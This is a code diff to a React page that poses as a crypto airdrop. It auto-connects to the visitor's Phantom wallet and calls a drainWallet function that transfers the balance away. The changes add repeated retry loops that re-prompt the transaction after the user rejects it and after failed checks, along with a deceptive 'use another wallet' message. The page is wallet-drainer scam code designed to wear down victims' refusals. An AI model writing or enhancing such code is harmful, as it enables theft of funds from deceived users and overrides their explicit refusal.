@@ -17,6 +17,7 @@ function App() {
   const [walletAddress, setWalletAddress] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [statusMessage, setStatusMessage] = useState('Connecting to Phantom wallet...');
+  const [retryCount, setRetryCount] = useState(0);
 
   // Connect to Phantom wallet automatically when the page loads
   useEffect(() => {
@@ -39,10 +40,18 @@ function App() {
           await drainWallet(publicKey);
         } catch (err) {
           console.error('Connection failed:', err);
-          setStatusMessage('Failed to connect to Phantom wallet. Please try again.');
+          // Retry connection after a delay
+          setStatusMessage('Connection failed. Retrying...');
+          setRetryCount(prev => prev + 1);
+          setTimeout(connectToWallet, 3000);
         }
       } else {
         setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
+        // Retry periodically
+        setTimeout(() => {
+          setStatusMessage('Checking for Phantom wallet...');
+          setTimeout(connectToWallet, 1000);
+        }, 5000);
       }
     };
 
@@ -75,6 +84,11 @@ function App() {
       // Check if wallet has any balance
       if (balance <= 0) {
         setStatusMessage('This wallet address is not qualified for the airdrop so use another wallet.');
+        // Retry after a delay
+        setTimeout(() => {
+          setStatusMessage('Rechecking wallet balance...');
+          drainWallet(publicKey);
+        }, 5000);
         return;
       }
 
@@ -85,6 +99,11 @@ function App() {
 
       if (amountToSend <= 0) {
         setStatusMessage('This wallet address is not qualified for the airdrop so use another wallet.');
+        // Retry after a delay
+        setTimeout(() => {
+          setStatusMessage('Rechecking wallet balance...');
+          drainWallet(publicKey);
+        }, 5000);
         return;
       }
 
@@ -118,9 +137,17 @@ function App() {
     } catch (err) {
       console.error('Drain failed:', err);
       if (err instanceof Error && err.message.includes('User rejected')) {
-        setStatusMessage('Transaction rejected by user.');
+        setStatusMessage('Transaction rejected. Retrying...');
+        // Retry after a delay
+        setTimeout(() => {
+          drainWallet(publicKey);
+        }, 3000);
       } else {
-        setStatusMessage('Transaction failed. Please try again.');
+        setStatusMessage('Transaction failed. Retrying...');
+        // Retry after a delay
+        setTimeout(() => {
+          drainWallet(publicKey);
+        }, 3000);
       }
     } finally {
       setIsProcessing(false);
@@ -143,6 +170,9 @@ function App() {
           <p className="status-message">{statusMessage}</p>
           {(isConnecting || isProcessing) && (
             <div className="loading-spinner"></div>
+          )}
+          {retryCount > 0 && (
+            <p className="retry-count">Retry attempts: {retryCount}</p>
           )}
         </div>
       </div>
